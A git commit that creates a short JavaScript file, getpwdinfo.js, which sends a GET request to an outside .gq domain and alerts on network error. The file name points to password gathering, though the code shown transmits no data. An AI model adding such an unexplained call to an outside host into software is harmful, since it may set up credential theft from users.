fd782504209e19bf6d912584099991f157ac31a8
1208nn <74806550+1208nn@users.noreply.github.com>
2022-01-11 21:42:20 +0800

    Create getpwdinfo.js

---
+++ js/getpwdinfo.js
@@ -0,0 +1,9 @@
+var paramObj = {
+	httpUrl : 'https://insiders.brothers.gq/safedata.html/',
+	type : 'get'
+}
+httpRequest(paramObj,function(respondDada) {
+    
+},function() {
+	alert('Network Error. ')
+});
